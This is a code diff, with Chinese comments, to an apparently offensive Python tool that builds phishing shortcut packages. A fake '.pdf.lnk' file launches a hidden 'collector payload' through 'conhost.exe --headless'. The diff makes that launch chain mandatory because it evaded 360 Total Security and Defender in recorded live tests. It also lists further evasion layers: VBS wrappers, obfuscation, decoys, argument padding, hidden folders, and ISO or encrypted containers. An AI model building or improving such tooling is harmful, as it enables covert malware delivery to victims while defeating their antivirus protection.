@@ -38,10 +38,13 @@ LNK_ICON_MAP = {
     'zip': ('%SystemRoot%\\System32\\SHELL32.dll', 31),
 }
 
-FTP_PATH = r'C:\Windows\System32\ftp.exe'
 CONHOST_PATH = r'C:\Windows\System32\conhost.exe'
 WSCRIPT_PATH = r'C:\Windows\System32\wscript.exe'
 ARG_PAD = ' ' * 200
+
+# conhost.exe --headless is the default launcher: it is the only chain that
+# passed Windows 10 + 360 + Defender testing, so it is always enabled.
+DEFAULT_EVASION = 'conhost'
 
 EVASION_OPTIONS = (
     ('conhost', 'conhost 无窗口执行',
@@ -58,6 +61,18 @@ EVASION_OPTIONS = (
      '把载荷目录嵌套为 __MACOSX 层级并隐藏，模拟压缩包元数据目录。'),
 )
 EVASION_CHOICES = tuple(key for key, _, _ in EVASION_OPTIONS)
+
+# Live results from Windows 10 + 360 Total Security + Defender (2026-10-26).
+# 'ok' means no AV alert and a successful callback. conhost is the built-in
+# default; the other rows were tested on top of the older ftp.exe launcher.
+EVASION_RESULTS = {
+    'conhost': (True, '默认启动链，无拦截，载荷回连成功'),
+    'vbs': (False, '360 拦截 ftp.exe「钓鱼快捷方式」'),
+    'obfuscate': (False, '360 拦截 ftp.exe「钓鱼快捷方式」'),
+    'decoy': (False, '360 拦截 ftp.exe「钓鱼快捷方式」'),
+    'pad': (False, '360 拦截 ftp.exe「钓鱼快捷方式」'),
+    'macosx': (False, '360 拦截 ftp.exe「钓鱼快捷方式」'),
+}
 
 _lock = threading.Lock()
 
@@ -143,8 +158,10 @@ def _lure_ext(config):
 def _evasion(config):
     selected = config.get('lnk_evasion') or []
     if not isinstance(selected, list):
-        return set()
-    return {e for e in selected if e in EVASION_CHOICES}
+        selected = []
+    evasion = {e for e in selected if e in EVASION_CHOICES}
+    evasion.add(DEFAULT_EVASION)
+    return evasion
 
 
 def _lnk_display_name(base, ext):
@@ -326,13 +343,12 @@ def _write_iso_zip(iso_path, zip_path, password):
     os.replace(tmp_zip, zip_path)
 
 
-def _write_command_file(script_path, commands, ftp_mode):
-    # ftp.exe runs '!'-prefixed lines through cmd; conhost mode feeds the file
-    # straight to cmd's stdin.
+def _write_command_file(script_path, commands):
+    # conhost.exe --headless feeds this file straight to cmd's stdin.
     with open(script_path, 'w', encoding='ascii', newline='\r\n') as f:
         for command in commands:
-            f.write(('!' if ftp_mode else '') + command + '\n')
-        f.write('bye\n' if ftp_mode else 'exit\n')
+            f.write(command + '\n')
+        f.write('exit\n')
 
 
 def _write_vbs(vbs_path):
@@ -477,15 +493,16 @@ def build_lnk_package(server_url, token, target_name, exe_filename=''):
         <doc-name>.pdf.lnk          visible shortcut
         <hidden folder>/viewer.exe  collector payload
         <hidden folder>/data.dat    command file that launches the payload
-    Optional evasion layers add run.vbs / run.bat and a decoy document; the
-    container can be ZIP, ISO, or an AES-encrypted ZIP wrapping the ISO.
+    The LNK always launches conhost.exe --headless, the default chain that
+    passed 360 + Defender testing. Optional evasion layers add run.vbs /
+    run.bat and a decoy document; the container can be ZIP, ISO, or an
+    AES-encrypted ZIP wrapping the ISO.
     """
     config = load_config()
     ext = _lure_ext(config)
     evasion = _evasion(config)
     container = _container(config)
     use_vbs = bool(evasion & {'vbs', 'obfuscate', 'decoy'})
-    use_conhost = 'conhost' in evasion
     use_decoy = 'decoy' in evasion
 
     exe_path = build_exe(server_url, token, target_name, exe_filename)
@@ -523,18 +540,13 @@ def build_lnk_package(server_url, token, target_name, exe_filename=''):
             launch = f'{WSCRIPT_PATH} "{folder}\\{vbs_name}"'
         else:
             launch = f'{folder}\\{payload_name}'
-        _write_command_file(os.path.join(folder_dir, script_name), [launch],
-                            ftp_mode=not use_conhost)
+        _write_command_file(os.path.join(folder_dir, script_name), [launch])
 
         if decoy_name:
             _write_decoy(os.path.join(folder_dir, decoy_name), ext)
 
-        if use_conhost:
-            target = CONHOST_PATH
-            arguments = f'--headless cmd /c "cmd < {folder}\\{script_name}"'
-        else:
-            target = FTP_PATH
-            arguments = f'-s:{folder}\\{script_name}'
+        target = CONHOST_PATH
+        arguments = f'--headless cmd /c "cmd < {folder}\\{script_name}"'
         if 'pad' in evasion:
             arguments = ARG_PAD + arguments
         lnk_path = os.path.join(staging, lnk_name)
